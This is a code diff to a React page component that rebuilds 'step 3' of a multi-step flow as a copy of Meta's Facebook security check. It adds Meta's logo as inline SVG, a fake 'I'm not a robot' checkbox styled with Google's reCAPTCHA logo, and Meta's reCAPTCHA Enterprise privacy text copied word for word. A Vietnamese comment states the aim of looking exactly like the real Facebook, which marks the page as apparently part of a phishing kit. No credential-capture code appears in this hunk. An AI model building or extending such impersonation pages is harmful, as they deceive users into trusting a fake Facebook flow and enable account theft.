@@ -712,43 +712,72 @@ export default function Home() {
           <div style={{ flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'flex-start', padding: '40px 16px' }}>
             <div style={{ width: '100%', maxWidth: '560px' }}>
 
-              {/* BƯỚC 3: CAPTCHA FULL PAGE */}
+                            {/* BƯỚC 3: CAPTCHA FULL PAGE - Giống hệt Facebook thật */}
               {step === 3 && (
-                <div>
-                  <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '16px', color: '#1c1e21' }}>Security check</h2>
-                  <p style={{ fontSize: '15px', color: '#65676b', marginBottom: '24px' }}>Please confirm you are human to continue.</p>
+                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', width: '100%', maxWidth: '440px', margin: '0 auto' }}>
                   
+                  {/* Logo Meta */}
+                  <div style={{ marginBottom: '16px' }}>
+                    <svg viewBox="0 0 60 12" height="24" xmlns="http://www.w3.org/2000/svg">
+                      <path fill="#0064e0" d="M11.9 0c-2.1 0-4.1.9-5.5 2.5L4.7 4.2C3.3 5.9 1.7 6.8 0 6.8V12h11.9c2.8 0 5.1-2.3 5.1-5.1S14.7 0 11.9 0zm0 9.4c-1.9 0-3.4-1.5-3.4-3.4S10 2.6 11.9 2.6s3.4 1.5 3.4 3.4-1.5 3.4-3.4 3.4zM23 4.3c-1.3 0-2.4.7-3 1.8V.8h-2.4v11.2h2.4V7.9c0-1.4.8-2.3 2.1-2.3 1.2 0 1.9.8 1.9 2.1v4.3h2.4V7.4c0-2.1-1.2-3.1-3.4-3.1zm8.1 3.6c0-1.1.6-1.8 1.6-1.8s1.6.7 1.6 1.8v4h2.4v-4.4c0-2.3-1.3-3.6-3.3-3.6-1.2 0-2.3.6-2.9 1.6V4.5h-2.4v7.5h2.4v-4.1zm8.5-3.4c-1.2 0-2.3.6-2.9 1.6V4.5h-2.4v7.5h2.4V8c0-1.4.8-2.3 2.1-2.3.3 0 .6.1.9.2V5.3c-.2-.1-.3-.1-.5-.1zM52.8 5.8l-2.2 1.3c.3.5.4 1.1.4 1.7 0 1.9-1.5 3.4-3.4 3.4-1.5 0-2.8-1-3.2-2.4l-2.2 1.3c.8 2.3 3 3.9 5.4 3.9 3.3 0 6-2.7 6-6 0-1.2-.3-2.3-.8-3.2zM47.6 0c-1.1 0-2.2.3-3.1.8l1.4 2.3c.5-.3 1.1-.4 1.7-.4 1.9 0 3.4 1.5 3.4 3.4 0 .5-.1 1-.3 1.4l2.2 1.3c.4-.8.7-1.7.7-2.7 0-3.3-2.7-6-6-6zM23.8 10.8L26 9.5c-.3-.5-.4-1.1-.4-1.7 0-1.9 1.5-3.4 3.4-3.4 1.5 0 2.8 1 3.2 2.4l2.2-1.3C33.6 3.2 31.4 1.6 29 1.6c-3.3 0-6 2.7-6 6 0 1.2.3 2.3.8 3.2z"/>
+                      <path fill="#0064e0" d="M47.6 1.6c1.2 0 2.3.6 2.9 1.6l1.4-2.3C50.5.3 49.1 0 47.6 0c-3.3 0-6 2.7-6 6 0 1 .3 1.9.7 2.7l2.2-1.3c-.1-.4-.3-.9-.3-1.4 0-1.9 1.5-3.4 3.4-3.4z"/>
+                    </svg>
+                  </div>
+
+                  {/* Khung reCAPTCHA */}
                   <div 
                     onClick={handleCaptchaClick}
                     style={{
-                      border: captchaChecked ? '2px solid #0064e0' : '2px solid #ccd0d5',
-                      borderRadius: '10px',
-                      padding: '24px 20px',
+                      border: '1px solid #d3d3d3',
+                      borderRadius: '3px',
+                      padding: '24px 12px',
                       display: 'flex',
                       alignItems: 'center',
-                      gap: '16px',
+                      justifyContent: 'space-between',
+                      background: '#f9f9f9',
                       cursor: captchaDone ? 'default' : 'pointer',
-                      background: captchaChecked ? '#eef4ff' : '#fafafa',
-                      transition: 'all 0.2s',
+                      width: '100%',
+                      boxSizing: 'border-box',
+                      boxShadow: '0 0 4px 1px rgba(0,0,0,0.08)',
                       userSelect: 'none'
                     }}
                   >
-                    <div style={{
-                      width: '28px', height: '28px', border: '2px solid',
-                      borderColor: captchaChecked ? '#0064e0' : '#bcc0c4',
-                      borderRadius: '6px', display: 'flex', alignItems: 'center', justifyContent: 'center',
-                      background: captchaChecked && !captchaLoading ? '#0064e0' : '#fff',
-                      flexShrink: 0, transition: 'all 0.2s'
-                    }}>
-                      {captchaChecked && !captchaLoading && <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
-                      {captchaLoading && <div style={{ width: '16px', height: '16px', border: '2.5px solid rgba(0,100,224,0.2)', borderTop: '2.5px solid #0064e0', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></div>}
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                      {/* Checkbox */}
+                      <div style={{
+                        width: '28px', height: '28px', border: '2px solid #c1c1c1',
+                        borderRadius: '2px', display: 'flex', alignItems: 'center', justifyContent: 'center',
+                        background: captchaChecked && !captchaLoading ? '#fff' : '#fff',
+                        flexShrink: 0, transition: 'all 0.2s'
+                      }}>
+                        {captchaChecked && !captchaLoading && <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
+                        {captchaLoading && <div style={{ width: '18px', height: '18px', border: '3px solid #e0e0e0', borderTop: '3px solid #4285f4', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>}
+                      </div>
+                      <span style={{ fontSize: '14px', color: '#000', fontWeight: '400' }}>
+                        I'm not a robot
+                      </span>
                     </div>
-                    <span style={{ fontSize: '16px', fontWeight: '500', color: captchaLoading ? '#0064e0' : '#1c2b33', flex: 1, textAlign: 'left' }}>
-                      {captchaDone ? 'Verified' : captchaLoading ? 'Verifying...' : "I'm not a robot"}
-                    </span>
-                    {captchaLoading && <div style={{ width: '24px', height: '24px', border: '2.5px solid rgba(0,100,224,0.15)', borderTop: '2.5px solid #0064e0', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></div>}
+                    
+                    {/* Logo reCAPTCHA */}
+                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+                      <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" style={{ width: '32px', height: '32px', marginBottom: '2px' }} />
+                      <span style={{ fontSize: '10px', color: '#555' }}>reCAPTCHA</span>
+                      <span style={{ fontSize: '8px', color: '#555' }}>Privacy - Terms</span>
+                    </div>
                   </div>
-                  <p style={{ fontSize: '12px', color: '#65676b', marginTop: '12px' }}>This helps us prevent automated access.</p>
+
+                  {/* Text mô tả bên dưới */}
+                  <div style={{ marginTop: '16px', fontSize: '12px', color: '#555', lineHeight: '1.5', textAlign: 'left', width: '100%' }}>
+                    <p style={{ margin: '0 0 10px 0' }}>
+                      This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
+                    </p>
+                    <p style={{ margin: '0 0 10px 0' }}>
+                      We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.
+                    </p>
+                    <p style={{ margin: 0 }}>
+                      reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.
+                    </p>
+                  </div>
                 </div>
               )}
 
